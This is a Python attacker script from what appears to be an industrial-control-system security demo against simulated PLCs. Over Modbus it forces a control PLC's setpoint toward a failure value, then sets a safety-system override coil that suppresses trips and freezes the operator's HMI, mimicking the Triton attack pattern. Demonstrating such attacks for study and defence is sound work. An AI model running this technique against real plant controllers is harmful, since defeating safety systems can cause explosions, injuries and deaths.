"""Standalone external attacker — over Modbus, across the two PLCs.

This is the demo's attacker: a separate process that reaches the plant ONLY
over the Modbus network (exactly what the HMI and bridge use) and drives the
process to failure with two writes:

  1. **Control-setpoint manipulation (the driver).** Write a malicious operating
     SETPOINT to the Control PLC (BPCS, %MW1). The BPCS control loop obediently
     drives its actuator to chase that setpoint — feed valves wide open, or the
     reactor's coolant valve shut — pushing the true process variable toward the
     failure threshold. With no attacker this setpoint stays at the operator's
     safe value and the process simply runs at baseline forever.

  2. **Safety defeat + HMI spoof.** Set the SIS_OVERRIDE coil on the Safety PLC
     (SIS). Step 1 alone would be caught by a healthy SIS (it trips and holds
     the process safe); the override suppresses that trip AND freezes the
     operator's HMI display at its last nominal value. Now the manipulated
     setpoint runs the process past failure while the HMI stays green.

This is the Triton attack PATTERN expressed over Modbus (manipulate the control
setpoint + force-override the safety logic), NOT Triton's TriStation/Triconex
program-injection MECHANISM — see OVERVIEW.md.

Usage (needs the venv + both PLCs reachable and RUNNING the scenario):
    .venv/bin/python -m attack.attack [tank|vessel|reactor]            # launch
    .venv/bin/python -m attack.attack [tank|vessel|reactor] --reset    # stand down
    .venv/bin/python -m attack.attack reactor --setpoint-only          # no SIS defeat

``--setpoint-only`` performs step 1 but not step 2, to show the healthy SIS
catching the manipulation (a useful "defense worked" contrast). The latched trip
and the override only clear on a runtime restart / this script's ``--reset``
(see plc/load_program.py --restart, or the dashboard's Reset button).
"""

from __future__ import annotations

import os
import sys

from bridge.plc_io import ModbusPlc
from common import registers as R
from common import scenarios


def main() -> None:
    args = [a for a in sys.argv[1:]]
    reset = "--reset" in args
    setpoint_only = "--setpoint-only" in args
    positional = [a for a in args if not a.startswith("--")]
    sid = positional[0] if positional else \
        os.environ.get("PETROTWIN_SCENARIO", scenarios.DEFAULT_SCENARIO)
    sc = scenarios.get(sid)

    bpcs = ModbusPlc.for_instance(R.Instance.BPCS)
    sis = ModbusPlc.for_instance(R.Instance.SIS)
    try:
        if reset:
            bpcs.write_holding(R.BpcsHolding.SETPOINT, sc.setpoint_reg)
            sis.write_coil(R.SisCoil.OVERRIDE, False)
            sp = sc.reg_to_pv(bpcs.read_holding(R.BpcsHolding.SETPOINT))
            print(f"STAND DOWN [{sc.id}]: setpoint restored to {sp:g} {sc.pv_units}, "
                  f"SIS_OVERRIDE cleared. Baseline control resumes next scan.")
            return

        # Step 1 — manipulate the control setpoint (the attack driver).
        bpcs.write_holding(R.BpcsHolding.SETPOINT, sc.attack_setpoint_reg)
        sp = sc.reg_to_pv(bpcs.read_holding(R.BpcsHolding.SETPOINT))
        print(f"ATTACK [{sc.id}]: BPCS setpoint forced to {sp:g} {sc.pv_units} "
              f"(safe is {sc.setpoint:g}) — the {sc.actuator} is driven to "
              f"push {sc.pv_name} toward {sc.failure_word}.")

        if setpoint_only:
            print("  --setpoint-only: SIS left ARMED. A healthy SIS should trip "
                  f"at {sc.trip_hh:g} {sc.pv_units} and hold the process safe.")
            return

        # Step 2 — defeat the safety layer and freeze the operator's view.
        sis.write_coil(R.SisCoil.OVERRIDE, True)
        ov = sis.read_coil(R.SisCoil.OVERRIDE)
        print(f"  SIS_OVERRIDE set (override={ov}): trip suppressed, HMI frozen "
              "at its last nominal value.")
        print("  The HMI stays green; watch the 3D ground truth run to "
              f"{sc.failure_word}.")
    finally:
        bpcs.close()
        sis.close()


if __name__ == "__main__":
    main()
